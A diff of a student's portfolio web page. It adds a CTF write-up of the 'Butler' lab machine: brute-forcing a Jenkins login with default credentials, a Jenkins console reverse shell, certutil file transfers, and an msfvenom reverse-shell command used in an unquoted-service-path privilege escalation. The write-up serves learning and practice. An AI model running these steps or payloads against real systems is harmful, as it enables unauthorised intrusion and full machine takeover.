@@ -105,13 +105,20 @@
     <div class="container">
         <section id="about" class="active">
             <h2>About Me</h2>
-            <p>Insert your about me text here.</p>
+            <p>Hi, my name is Johnny Tavares and welcome to my site! I'm a passionate Information Technology enthusiast and computer science major, currently pursuing my Security+ certification. I'm working on building impactful projects in Python to showcase my security expertise, while also honing my skills through things like CTF challenges , research, etc. As a bonus, I like exploring game development using Unity and C# to express my creativity.</p>
+            <ul>
+                <li><a href="https://www.github.com/johnny-tavares">Github</a></li>
+                <li><a href="https://www.linkedin.com/in/johnny-tavares">Linkedin</a></li>
+            </ul>
         </section>
         <section id="projects">
             <h2>Projects</h2>
             <div class="subsection" onclick="toggleSubsection('project1')">Threat Dashboard</div>
             <div id="project1" class="subsection-content">
-                <p>Details about Threat Dashboard.</p>
+                <p>Find on Github</p>
+                <a href="https://www.github.com/johnny-tavares/Threat_Dashboard">
+                    <img src="Dashboard.png">
+                </a>
             </div>
             <div class="subsection" onclick="toggleSubsection('project2')">Home SIEM Lab</div>
             <div id="project2" class="subsection-content">
@@ -120,25 +127,73 @@
         </section>
         <section id="ctf">
             <h2>CTF Write-ups</h2>
-            <div class="subsection" onclick="toggleSubsection('ctf1')">Buffer Overflow Exploit</div>
+            <div class="subsection" onclick="toggleSubsection('ctf1')">Butler(TCM Security)</div>
             <div id="ctf1" class="subsection-content">
-                <p>Write-up on Buffer Overflow Exploit.</p>
+
+    <h2>Initial Enumeration</h2>
+    <p>The first step was running an <strong>nmap scan</strong> to check open ports on the machine. The scan revealed <strong>port 8080</strong> running <strong>HTTP</strong>, which was hosting a <strong>Jenkins</strong> service. With Jenkins running, I decided to attempt a <strong>brute force attack</strong> on the login page using <strong>Burp Suite</strong>.</p>
+
+    <h3>Brute Forcing with Burp Suite</h3>
+    <p>Using a <strong>Cluster Bomb attack</strong> in Burp Suite, I tried a few common usernames and passwords. After some testing, the valid credentials turned out to be:</p>
+    <ul>
+        <li><strong>Username:</strong> jenkins</li>
+        <li><strong>Password:</strong> jenkins</li>
+    </ul>
+    <p>This login worked, as evidenced by a change in the length of the response after submitting the credentials.</p>
+
+    <h2>Exploitation</h2>
+    <p>Once logged into Jenkins, I searched for known <strong>Jenkins exploits</strong>. It seems there is a vulnerability that allows us to gain a <strong>reverse shell</strong> through the Jenkins <strong>console</strong> in the settings. This vulnerability gave me system access, and I was now logged in as the user <strong>butler</strong>.</p>
+
+    <h2>Privilege Escalation</h2>
+
+    <h3>Step 1: Downloading and Hosting WinPEAS</h3>
+    <p>First, I downloaded <strong>winpeas</strong>, a tool designed for privilege escalation enumeration on Windows. Since it was a Windows machine, I used the <strong>Windows version of linpeas</strong> called <strong>winpeas</strong>.</p>
+    <p>To make <strong>winpeas</strong> available to the machine, I:</p>
+    <ol>
+        <li>Hosted a <strong>Python HTTP server</strong> to serve the script:</li>
+        <pre><code>python -m http.server 80</code></pre>
+        <li>Changed the directory to <code>C:/users/butler</code>, as it would allow me to run the <strong>winpeas</strong> script.</li>
+    </ol>
+
+    <h3>Step 2: Transfer winpeas using Certutil.exe</h3>
+    <p>I used <strong>certutil.exe</strong> to fetch the <strong>winpeas</strong> script from the Python HTTP server I had set up.</p>
+
+    <h3>Step 3: Unquoted Service Path Attack</h3>
+    <p>Next, I discovered that the <strong>WiseCare</strong> service had an <strong>unquoted service path</strong> vulnerability, which is a common privilege escalation vector in Windows environments.</p>
+    <img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/849488af-4c65-425e-9506-2a99b38e533d/fc14d5f8-93f5-414e-a7ab-fdf45e884044/Untitled.png" alt="WiseCare Vulnerability Screenshot">
+
+    <h3>Step 4: Generating Malicious Payload with msfvenom</h3>
+    <p>To take advantage of this, I used <strong>msfvenom</strong> to generate a <strong>reverse shell payload</strong>. The payload I generated was designed to execute a shell on my machine with <strong>SYSTEM</strong> privileges when the vulnerable service starts:</p>
+    <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.206.128 LPORT=7777 -f exe &gt; Wise.exe</code></pre>
+
+    <h3>Step 5: Transferring the Payload</h3>
+    <p>I then transferred the <strong>Wise.exe</strong> payload to the <strong>WiseCare</strong> folder located in <code>Program Files (x86)</code>. To do this, I hosted the <strong>Wise.exe</strong> file again using the Python HTTP server, and then used <strong>certutil.exe</strong> to download the payload.</p>
+
+    <h3>Step 6: Stopping and Restarting the Vulnerable Service</h3>
+    <p>I stopped the <strong>WiseBootAssistant</strong> service using the following command:</p>
+    <pre><code>sc stop WiseBootAssistant</code></pre>
+    <p>Then, I restarted the service with:</p>
+    <pre><code>sc start WiseBootAssistant</code></pre>
+    <p>When the service started, it executed the <strong>Wise.exe</strong> payload, which resulted in a <strong>SYSTEM shell</strong> being returned to me.</p>
+
+    <h2>Conclusion</h2>
+    <p>At this point, I had successfully escalated my privileges to <strong>SYSTEM</strong> and had full control of the machine. The combination of a <strong>Jenkins brute force attack</strong>, <strong>reverse shell through Jenkins</strong>, and exploiting the <strong>unquoted service path vulnerability</strong> in <strong>WiseCare</strong> allowed me to gain full access and escalate privileges on the <strong>Butler</strong> machine.</p>
             </div>
-            <div class="subsection" onclick="toggleSubsection('ctf2')">SQL Injection Challenge</div>
+            <div class="subsection" onclick="toggleSubsection('ctf2')">Coming soon!</div>
             <div id="ctf2" class="subsection-content">
-                <p>Write-up on SQL Injection Challenge.</p>
+                <p></p>
             </div>
         </section>
         <section id="research">
             <h2>Research</h2>
-            <div class="subsection" onclick="toggleSubsection('research1')">Firmware Backdoor Analysis</div>
+            <div class="subsection" onclick="toggleSubsection('research1')">Coming soon!</div>
             <div id="research1" class="subsection-content">
-                <p>Details on Firmware Backdoor Analysis.</p>
+                <p>Coming soon!</p>
             </div>
         </section>
         <section id="blog">
             <h2>Blog</h2>
-            <p>Insert your blog posts here.</p>
+            <p>Coming soon!</p>
         </section>
     </div>
     <footer>
